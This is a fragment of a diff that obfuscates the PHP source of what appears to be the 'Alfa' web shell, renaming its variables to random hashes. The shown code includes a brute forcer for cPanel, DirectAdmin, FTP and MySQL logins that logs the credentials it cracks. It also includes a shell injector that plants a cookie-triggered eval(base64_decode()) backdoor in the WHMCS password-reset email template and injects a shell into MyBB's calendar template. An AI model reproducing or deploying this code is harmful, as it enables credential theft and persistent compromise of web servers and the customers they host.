+if($predzshad56b699830e77ba53855679cb1d252da){CrackerResualt($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);}}}
+@ftp_close($kghebeva7ed201fa20d25d22b291dc85ae9e5ced);
 }
-function CrackerResualt($info){
-$res = $info['target'].' => '.$info['username'].":".$info['password']."\n" ;
-$c = @fopen($info['fcrack'],'a+');
-@fwrite($c, $res);
-@fclose($c);
+function CrackerResualt($xmsoipopcaf9b6b99962bf5c2264824231d7a40c){
+$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $xmsoipopcaf9b6b99962bf5c2264824231d7a40c['target'].' => '.$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['username'].":".$xmsoipopcaf9b6b99962bf5c2264824231d7a40c['password']."\n" ;
+$yyphbkaj4a8a08f09d37b73795649038408b5f33 = @fopen($xmsoipopcaf9b6b99962bf5c2264824231d7a40c['fcrack'],'a+');
+@fwrite($yyphbkaj4a8a08f09d37b73795649038408b5f33, $ybaqpbzt9b207167e5381c47682c6b4f58a623fb);
+@fclose($yyphbkaj4a8a08f09d37b73795649038408b5f33);
 }
-function Alfa_Call_Function_Cracker($method,$info){
-switch($method){case 'cp':return Alfa_CP_Cracker($info);break;case 'direct': case 'phpmyadmin':return Alfa_DirectAdmin_Cracker($info);break;case 'ftp':return Alfa_FTP_Cracker($info);break;case 'mysql':return Alfa_Mysql_Cracker($info);break;case 'mysql':return Alfa_FTPC($info);break;}
+function Alfa_Call_Function_Cracker($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce,$xmsoipopcaf9b6b99962bf5c2264824231d7a40c){
+switch($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce){case 'cp':return Alfa_CP_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);break;case 'direct': case 'phpmyadmin':return Alfa_DirectAdmin_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);break;case 'ftp':return Alfa_FTP_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);break;case 'mysql':return Alfa_Mysql_Cracker($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);break;case 'mysql':return Alfa_FTPC($xmsoipopcaf9b6b99962bf5c2264824231d7a40c);break;}
 }
 function alfaCrackers(){
 alfahead();
 AlfaNum(9,10);
 echo '<div class="header"><center><br><div class="txtfont_header">| Brute Forcer |</div><br><br><form method="post" onsubmit="g(\'Crackers\',null,this.target.value,this.port.value,this.usernames.value,this.passwords.value,this.fcrack.value,\'start\',this.protocol.value,this.loginpanel.value);return false;"><div class="txtfont">Login Page: <select onclick="dis_input(this.value);" name="loginpanel">';
-foreach(array('cp'=>'Cpanel','direct'=>'DirectAdmin','ftp'=>'FTP','phpmyadmin'=>'PhpMyAdmin[DirectAdmin]','mysql'=>'mysql_connect()','ftpc'=>'ftp_connect()') as $key=>$val)echo('<option value="'.$key.'">'.$val.'</option>');
+foreach(array('cp'=>'Cpanel','direct'=>'DirectAdmin','ftp'=>'FTP','phpmyadmin'=>'PhpMyAdmin[DirectAdmin]','mysql'=>'mysql_connect()','ftpc'=>'ftp_connect()') as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)echo('<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'">'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>');
 echo '</select> Protocol: <select id="protocol" name="protocol">';
-foreach(array('https://','http://','ftp://') as $val)echo('<option value="'.$val.'">'.$val.'</option>');
+foreach(array('https://','http://','ftp://') as $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)echo('<option value="'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'">'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>');
 echo '</select> Website/ip Address: <input id="target" type="text" name="target" value="localhost">
 Port: <input id="port" type="text" name="port" value="2083">
 <table width="30%"><td align="center">Users List</td><td align="center">Passwords</td></table>
@@ -1826,23 +1900,23 @@ Port: <input id="port" type="text" name="port" value="2083">
 &nbsp <textarea placeholder="Passwords" rows="20" cols="25" name="passwords"></textarea><br><br>
 Save Result Into File <input type="text" name="fcrack" value="cracked.txt">
 <p><input type="submit" name="cracking" value=" " /></div></form></p><center>';
-$target = str_replace(array('https://','http://','ftp://'),'',$_POST['alfa1']);
-$port = $_POST['alfa2'];
-$usernames= $_POST['alfa3'];
-$passwords = $_POST['alfa4'];
-$fcrack = $_POST['alfa5'];
-$cracking = $_POST['alfa6'];
-$protocol = $_POST['alfa7'];
-$loginpanel = $_POST['alfa8'];
-$p = $loginpanel == 'phpmyadmin' ? $p = true : false;
-if($cracking=='start'){
+$nyvfphvm42aefbae01d2dfd981f7da7d823d689e = str_replace(array('https://','http://','ftp://'),'',$_POST['alfa1']);
+$fbwqabyz901555fb06e346cb065ceb9808dcfc25 = $_POST['alfa2'];
+$tvrycbale7d37718e184e9b0e24dc63b4327e15e= $_POST['alfa3'];
+$dyukwkie48cccca3bab2ad18832233ee8dff1b0b = $_POST['alfa4'];
+$pokhxlbj454ca9a56ef4c3d664046fa330f2bdd1 = $_POST['alfa5'];
+$wzwtfumy4d1f35512954cb227b25bbd92e15bc7b = $_POST['alfa6'];
+$xxhhyqmq81788ba0d7d02d81c063dbca621ba11b = $_POST['alfa7'];
+$ruxmuzve0056fed2e861548bc83d7220fe05cbcb = $_POST['alfa8'];
+$fxuvmwpb83878c91171338902e0fe0fb97a8c47a = $ruxmuzve0056fed2e861548bc83d7220fe05cbcb == 'phpmyadmin' ? $fxuvmwpb83878c91171338902e0fe0fb97a8c47a = true : false;
+if($wzwtfumy4d1f35512954cb227b25bbd92e15bc7b=='start'){
 echo __pre();
-$exuser = explode("\n",$usernames);
-$expw = explode("\n",$passwords);
-foreach($exuser as $user){
-foreach($expw as $pw){
-$array = array('username' => trim($user),'password' => trim($pw),'port' => trim($port),'target' => trim($target),'protocol' => trim($protocol),'fcrack' => trim($fcrack),'mysql' => $p);
-Alfa_Call_Function_Cracker($loginpanel,$array);
+$soiqswdn0b5396d6bd0867485ff63067ad9363e7 = explode("\n",$tvrycbale7d37718e184e9b0e24dc63b4327e15e);
+$whuyvdnk5a009fadd3713331621174e8169e00aa = explode("\n",$dyukwkie48cccca3bab2ad18832233ee8dff1b0b);
+foreach($soiqswdn0b5396d6bd0867485ff63067ad9363e7 as $eeodyzriee11cbb19052e40b07aac0ca060c23ee){
+foreach($whuyvdnk5a009fadd3713331621174e8169e00aa as $zpijxrap8fe4c11451281c094a6578e6ddbf5eed){
+$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5 = array('username' => trim($eeodyzriee11cbb19052e40b07aac0ca060c23ee),'password' => trim($zpijxrap8fe4c11451281c094a6578e6ddbf5eed),'port' => trim($fbwqabyz901555fb06e346cb065ceb9808dcfc25),'target' => trim($nyvfphvm42aefbae01d2dfd981f7da7d823d689e),'protocol' => trim($xxhhyqmq81788ba0d7d02d81c063dbca621ba11b),'fcrack' => trim($pokhxlbj454ca9a56ef4c3d664046fa330f2bdd1),'mysql' => $fxuvmwpb83878c91171338902e0fe0fb97a8c47a);
+Alfa_Call_Function_Cracker($ruxmuzve0056fed2e861548bc83d7220fe05cbcb,$vmwhayoqf1f713c9e000f5d3f280adbd124df4f5);
 }
 }
 echo '<br><font color="red">Attack Finished...</font>';
@@ -1850,17 +1924,17 @@ echo '<br><font color="red">Attack Finished...</font>';
 echo '</div>';
 alfafooter();
 }
-function output($string){ echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$string."'>Click Here !</a></font></b></center><br><br>";}
+function output($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21){ echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21."'>Click Here !</a></font></b></center><br><br>";}
 function alfaShellInjectors(){
 alfahead();
 echo '<div class=header>';
 AlfaNum(11);
 echo '<center><p><div class="txtfont_header">| Cms Shell Injector |</div></p><center><h3><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,\'whmcs\',null)">| WHMCS | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,\'mybb\')">| MyBB | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,null,\'vb\')">| vBulletin |</a></h3></center>';
-$selector = '<p><div class="txtfont">Shell Inject Method : </div> <select name="method" style="width:100px;"><option value="auto">AutoMatic</option><option value="man">Manuel</option></select></p>';
+$gheoiswh5b3c32009797feb79096d52e56a56b82 = '<p><div class="txtfont">Shell Inject Method : </div> <select name="method" style="width:100px;"><option value="auto">AutoMatic</option><option value="man">Manuel</option></select></p>';
 if(isset($_POST['alfa1']) && $_POST['alfa1']== 'whmcs'){
 AlfaNum();
 echo __pre()."<p><div class='txtfont_header'>| WHMCS |</div></p><center><center><p>".getConfigHtml('whmcs')."</p><form onSubmit=\"g('ShellInjectors',null,'whmcs',null,null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.path.value); return false;\" method='post'>";
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Path WHMCS Url : ', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host : ', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
@@ -1871,47 +1945,47 @@ $table = array('td1' =>
  'td5' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Pass : ', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
 );
-create_table($table);
-echo $selector;
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
+echo $gheoiswh5b3c32009797feb79096d52e56a56b82;
 echo "<p><input type='submit' value=' '></p></form></center></td></tr></table></center>";
 if(isset($_POST['alfa6'])) {
-$dbu = $_POST['alfa6'];
-$dbn = $_POST['alfa7'];
-$dbp = $_POST['alfa8'];
-$dbh = $_POST['alfa9'];
-$path = $_POST['alfa10'];
-$method = $_POST['alfa4'];
-$index = "{php}".ALFA_UPLOADER.";{/php}";
-$newin = str_replace("'","\'",$index);
-$newindex = "<p>Dear $newin,</p><p>Recently a request was submitted to reset your password for our client area. If you did not request this, please ignore this email. It will expire and become useless in 2 hours time.</p><p>To reset your password, please visit the url below:<br /><a href=\"{\$pw_reset_url}\">{\$pw_reset_url}</a></p><p>When you visit the link above, your password will be reset, and the new password will be emailed to you.</p><p>{\$signature}</p>{php}if(\$_COOKIE[\"sec\"] == \"123\"){eval(base64_decode(\$_COOKIE[\"sec2\"])); die(\"!\");}{\/php}";
-if(!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index)){
-if(filter_var($path,FILTER_VALIDATE_URL)){
-$conn = mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_connect_error());
-$soleSave= mysqli_query($conn,"select message from tblemailtemplates where name='Password Reset Validation'");
-$soleGet = mysqli_fetch_assoc($soleSave);
-$tempSave1 = $soleGet['message'];
-$tempSave = str_replace("'","\'",$tempSave1);
-mysqli_query($conn,"UPDATE tblconfiguration SET value = '1' WHERE setting = 'AllowSmartyPhpTags'") or die (mysqli_error($conn));
-$inject = "UPDATE tblemailtemplates SET message='$newindex' WHERE name='Password Reset Validation'";
-$result = mysqli_query($conn,$inject) or die (mysqli_error($conn));
-$create = "insert into tblclients (email) values('solevisible@fbi.gov')";
-$result2 = mysqli_query($conn,$create) or die (mysqli_error($conn));
-if(function_exists('curl_version') && $method == 'auto'){
-$AlfaSole = new AlfaCURL(true);
-$saveurl = $AlfaSole->Send($path."/pwreset.php");
-$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
-$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=solevisible@fbi.gov");
-$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
-$Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
+$fpgvfxxse68767ea79ef0c42d8c4653b39374eda = $_POST['alfa6'];
+$kqckaclr7980a849b1d26dcf210bf4fb030c6a21 = $_POST['alfa7'];
+$cxvugbgf06b18ac8deaf14a6416183145c06238c = $_POST['alfa8'];
+$kwizkcfd1eb267706e34aa7423b280c24efdd775 = $_POST['alfa9'];
+$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $_POST['alfa10'];
+$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa4'];
+$hdnhijeh6a992d5529f459a44fee58c733255e86 = "{php}".ALFA_UPLOADER.";{/php}";
+$dzlihuut98f29c1c71529ab0636229f44548a6dd = str_replace("'","\'",$hdnhijeh6a992d5529f459a44fee58c733255e86);
+$xxxksccd0f6c36f3f097bf101cb02e03d35d4546 = "<p>Dear $dzlihuut98f29c1c71529ab0636229f44548a6dd,</p><p>Recently a request was submitted to reset your password for our client area. If you did not request this, please ignore this email. It will expire and become useless in 2 hours time.</p><p>To reset your password, please visit the url below:<br /><a href=\"{\$pw_reset_url}\">{\$pw_reset_url}</a></p><p>When you visit the link above, your password will be reset, and the new password will be emailed to you.</p><p>{\$signature}</p>{php}if(\$_COOKIE[\"sec\"] == \"123\"){eval(base64_decode(\$_COOKIE[\"sec2\"])); die(\"!\");}{\/php}";
+if(!empty($kwizkcfd1eb267706e34aa7423b280c24efdd775) && !empty($fpgvfxxse68767ea79ef0c42d8c4653b39374eda) && !empty($kqckaclr7980a849b1d26dcf210bf4fb030c6a21) && !empty($hdnhijeh6a992d5529f459a44fee58c733255e86)){
+if(filter_var($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,FILTER_VALIDATE_URL)){
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898 = mysqli_connect($kwizkcfd1eb267706e34aa7423b280c24efdd775,$fpgvfxxse68767ea79ef0c42d8c4653b39374eda,$cxvugbgf06b18ac8deaf14a6416183145c06238c,$kqckaclr7980a849b1d26dcf210bf4fb030c6a21) or die(mysqli_connect_error());
+$opcdvzxn2f7c038d5d136408be8fe0506ecbe989= mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select message from tblemailtemplates where name='Password Reset Validation'");
+$jlghjstf72956065c7d6a9706978c03d86a6a579 = mysqli_fetch_assoc($opcdvzxn2f7c038d5d136408be8fe0506ecbe989);
+$zomeopxz5afebf01d42bfdc7d07222bca225eadd = $jlghjstf72956065c7d6a9706978c03d86a6a579['message'];
+$nwsybgtvdfe88d6af280e0ce512e3fb549b63280 = str_replace("'","\'",$zomeopxz5afebf01d42bfdc7d07222bca225eadd);
+mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"UPDATE tblconfiguration SET value = '1' WHERE setting = 'AllowSmartyPhpTags'") or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$vagiaqvoa181b4673216ad247a0f78066a9646e1 = "UPDATE tblemailtemplates SET message='$xxxksccd0f6c36f3f097bf101cb02e03d35d4546' WHERE name='Password Reset Validation'";
+$nmxeqhvab4a88417b3d0170d754c647c30b7216a = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$vagiaqvoa181b4673216ad247a0f78066a9646e1) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$tyxqkdic76ea0bebb3c22822b4f0dd9c9fd021c5 = "insert into tblclients (email) values('solevisible@fbi.gov')";
+$ecwemfrq486a9bbc2c582b30c8899b6f20a7e59e = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$tyxqkdic76ea0bebb3c22822b4f0dd9c9fd021c5) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+if(function_exists('curl_version') && $qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == 'auto'){
+$yjikdmnn94305ab3e8d752859bc2a3ae1e55cd87 = new AlfaCURL(true);
+$xlxkfxnna14152b8ce9d915a253ff5f08bb98856 = $yjikdmnn94305ab3e8d752859bc2a3ae1e55cd87->Send($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/pwreset.php");
+$snxircere71105459c77e7298b33c904bdf742be = preg_match("/name=\"token\" value=\"(.*?)\"/i",$xlxkfxnna14152b8ce9d915a253ff5f08bb98856,$cjbqugpw94a08da1fecbb6e8b46990538c7b50b2);
+$yjikdmnn94305ab3e8d752859bc2a3ae1e55cd87->Send($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/pwreset.php","post","token={$cjbqugpw94a08da1fecbb6e8b46990538c7b50b2[1]}&action=reset&email=solevisible@fbi.gov");
+$xvddzlni9518b395576a418af8d4f2a87042b7d7 = "UPDATE tblemailtemplates SET message='{$nwsybgtvdfe88d6af280e0ce512e3fb549b63280}' WHERE name='Password Reset Validation'";
+$qyzyxyfr54e6dce5bb57581b9fffe5c2f7d54f44 = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$xvddzlni9518b395576a418af8d4f2a87042b7d7) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
 __alert("shell injectet...");
-$ff= 'http://'.$path."/solevisible.php";
-output($ff);}else{
-echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
+$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31= 'http://'.$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/solevisible.php";
+output($uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31);}else{
+echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/pwreset.php' target='_blank'>".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/solevisible.php' target='_blank'>".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
 }if(isset($_POST['alfa2']) && $_POST['alfa2']== 'mybb'){
 AlfaNum(1,2,3,5);
 echo __pre()."<p><div class='txtfont_header'>| MyBB |</div></p><center><center>".getConfigHtml("mybb")."<form id='sendajax' onSubmit=\"g('ShellInjectors',null,null,'mybb',null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.prefix.value); return false;\" method=POST>
 ";
-$table = array('td1' =>
+$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'dbh', 'id'=>'db_host','inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'DataBase Name : ', 'inputName' => 'dbn', 'id'=>'db_name' ,'inputValue' => '', 'inputSize' => '50'),
@@ -1922,61 +1996,61 @@ $table = array('td1' =>
  'td5' =>
  array('color' => 'FFFFFF', 'tdName' => 'Table Prefix : ', 'inputName' => 'prefix', 'id'=>'db_prefix','inputValue' => 'mybb_', 'inputSize' => '50')
 );
-create_table($table);
-echo $selector;
+create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
+echo $gheoiswh5b3c32009797feb79096d52e56a56b82;
 echo "<p><input type=submit value=' '></p></form></center></center>";
 if(isset($_POST['alfa6'])) {
-$dbu = $_POST['alfa6'];
-$dbn = $_POST['alfa7'];
-$dbp = $_POST['alfa8'];
-$dbh = $_POST['alfa9'];
-$prefix = $_POST['alfa10'];
-$method = $_POST['alfa4'];
-$shellCode = "{\${".ALFA_UPLOADER."}}";
-$newinshell = str_replace("'","\'",$shellCode);
-if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($newinshell)){
-$conn = mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
-$inject = "select template from {$prefix}templates where  title= 'calendar'";
-$result = mysqli_query($conn, $inject) or die (mysqli_error($conn));
-$GetTemp = mysqli_fetch_assoc($result);
-$saveDate = $GetTemp['template'];
-$repsave = str_replace($shellCode,"",$saveDate);
-$repsave = str_replace("'","\'",$repsave);
-$createShell = "update {$prefix}templates SET template= '".$newinshell.$repsave."' where title = 'calendar'";
-$result2 = mysqli_query($conn,$createShell) or die (mysqli_error($conn));
-$geturl = "select value from {$prefix}settings where name= 'bburl'";
-$findurl = mysqli_query($conn,$geturl) or die (mysqli_error($conn));
-$rowb = mysqli_fetch_assoc($findurl);
-$furl = $rowb['value'];
-$realurl = parse_url($furl,PHP_URL_HOST);
-$realpath = parse_url($furl,PHP_URL_PATH);
-$res = false;
-$AlfaCurl = new AlfaCURL();
-if (extension_loaded('sockets') && function_exists('fsockopen') && $method == 'auto' ){
-if ($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)){
-@fputs($fsock, "GET $realpath/calendar.php HTTP/1.1\r\n");
-@fputs($fsock, "HOST: $realurl\r\n");
-@fputs($fsock, "Connection: close\r\n\r\n");
-$check = fgets($fsock);
-if(preg_match("/200 OK/i",$check)){
-$repairdbtemp = "update {$prefix}templates SET template= '$repsave' where title = 'calendar'";
-$clear = mysqli_query($conn,$repairdbtemp) or die (mysqli_error($conn));$res = true;}
-@fclose($fsock);}}elseif(function_exists('curl_version') && $method == 'auto'){
-$AlfaCurl->Send($realurl.$realpath."/calendar.php");
-$res = true;
+$fpgvfxxse68767ea79ef0c42d8c4653b39374eda = $_POST['alfa6'];
+$kqckaclr7980a849b1d26dcf210bf4fb030c6a21 = $_POST['alfa7'];
+$cxvugbgf06b18ac8deaf14a6416183145c06238c = $_POST['alfa8'];
+$kwizkcfd1eb267706e34aa7423b280c24efdd775 = $_POST['alfa9'];
+$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa10'];
+$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa4'];
+$njeibuiufa1651ef6048d884a57f6ac5ebb77bcd = "{\${".ALFA_UPLOADER."}}";
+$uovfqkfob035ad08bda3cd59628f600824fca885 = str_replace("'","\'",$njeibuiufa1651ef6048d884a57f6ac5ebb77bcd);
+if (!empty($kwizkcfd1eb267706e34aa7423b280c24efdd775) && !empty($fpgvfxxse68767ea79ef0c42d8c4653b39374eda) && !empty($kqckaclr7980a849b1d26dcf210bf4fb030c6a21) && !empty($uovfqkfob035ad08bda3cd59628f600824fca885)){
+$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898 = mysqli_connect($kwizkcfd1eb267706e34aa7423b280c24efdd775,$fpgvfxxse68767ea79ef0c42d8c4653b39374eda,$cxvugbgf06b18ac8deaf14a6416183145c06238c,$kqckaclr7980a849b1d26dcf210bf4fb030c6a21) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$vagiaqvoa181b4673216ad247a0f78066a9646e1 = "select template from {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}templates where  title= 'calendar'";
+$nmxeqhvab4a88417b3d0170d754c647c30b7216a = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $vagiaqvoa181b4673216ad247a0f78066a9646e1) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$fuczwtrf6e58093dbb06ecf3eeb0af38e8c595bb = mysqli_fetch_assoc($nmxeqhvab4a88417b3d0170d754c647c30b7216a);
+$rmobaiowaf4d9472164db1977fb80dd6fdbc3cc7 = $fuczwtrf6e58093dbb06ecf3eeb0af38e8c595bb['template'];
+$cafoczgf137bc5ce25fe8315f059c27d565ff683 = str_replace($njeibuiufa1651ef6048d884a57f6ac5ebb77bcd,"",$rmobaiowaf4d9472164db1977fb80dd6fdbc3cc7);
+$cafoczgf137bc5ce25fe8315f059c27d565ff683 = str_replace("'","\'",$cafoczgf137bc5ce25fe8315f059c27d565ff683);
+$hmydfavmc109d32ba56199a6bed232dca4c6a9bd = "update {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}templates SET template= '".$uovfqkfob035ad08bda3cd59628f600824fca885.$cafoczgf137bc5ce25fe8315f059c27d565ff683."' where title = 'calendar'";
+$ecwemfrq486a9bbc2c582b30c8899b6f20a7e59e = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$hmydfavmc109d32ba56199a6bed232dca4c6a9bd) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$jxnfsvuo6b72d14a2b5f0d92a740ccb55a2599d8 = "select value from {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}settings where name= 'bburl'";
+$zjytqmxl2a840ec0a659d6253eb19b51d4590a34 = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$jxnfsvuo6b72d14a2b5f0d92a740ccb55a2599d8) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
+$cegxxvpzddb80dbc3f392dbc92cc7503a917bc2c = mysqli_fetch_assoc($zjytqmxl2a840ec0a659d6253eb19b51d4590a34);
+$wofnllibcaada241d2c66add02282b7049cb796b = $cegxxvpzddb80dbc3f392dbc92cc7503a917bc2c['value'];
+$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5 = parse_url($wofnllibcaada241d2c66add02282b7049cb796b,PHP_URL_HOST);
+$qixiukvof1717c0d3bb9106455d837859192864e = parse_url($wofnllibcaada241d2c66add02282b7049cb796b,PHP_URL_PATH);
+$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = false;
+$qtzwvaxf0f3bcb5d866baa3eb38bf9b21ee8d4f3 = new AlfaCURL();
+if (extension_loaded('sockets') && function_exists('fsockopen') && $qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == 'auto' ){
+if ($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650 = @fsockopen($hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5, 80, $irrxgcsz70106d0d821513f45702b7d25664ab7c, $ivgnqlyv809b1abe3f111fd3bb1a54c62706129f, 10)){
+@fputs($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650, "GET $qixiukvof1717c0d3bb9106455d837859192864e/calendar.php HTTP/1.1\r\n");
+@fputs($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650, "HOST: $hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5\r\n");
+@fputs($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650, "Connection: close\r\n\r\n");
+$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87 = fgets($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650);
+if(preg_match("/200 OK/i",$kzacvspl0ba4439ee9a46d9d9f14c60f88f45f87)){
+$awhcmbbl2b6f1ba86c32649959d9371e01d771db = "update {$unkkdhum851f5ac9941d720844d143ed9cfcf60a}templates SET template= '$cafoczgf137bc5ce25fe8315f059c27d565ff683' where title = 'calendar'";
+$atcoqgyn01bc6f8efa4202821e95f4fdf6298b30 = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$awhcmbbl2b6f1ba86c32649959d9371e01d771db) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = true;}
+@fclose($fjokjurq6e8f43e8b6d7cc10a1c335fc49b4e650);}}elseif(function_exists('curl_version')&& $qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == 'auto'){
+$qtzwvaxf0f3bcb5d866baa3eb38bf9b21ee8d4f3->Send($hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e."/calendar.php");
+$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = true;
 }
-if($res){
-$ff = 'http://'.$realurl.$realpath."/solevisible.php";
-output($ff);
+if($ybaqpbzt9b207167e5381c47682c6b4f58a623fb){
+$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31 = 'http://'.$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e."/solevisible.php";
+output($uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31);
 }else{
-$ff = 'http://'.$realurl.$realpath."/calendar.php";
-$fff = 'http://'.$realurl.$realpath."/solevisible.php";
-echo "<br><pre id='strOutput' style='margin-top:5px' class='ml1'><br><center><b><font color='#FFFFFF'>Please Go To Target => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color='#FFFFFF'>And Go To => </font><a href='".$fff."' target='_blank'>".$fff."</a></b></center><br><br>";
+$uhqxkymr633de4b0c14ca52ea2432a3c8a5c4c31 = 'http://'.$hgfpzlryf10b9206f9ba6ba9eb1a6c084a594ef5.$qixiukvof1717c0d3bb9106455d837859192864e."/calendar.php";
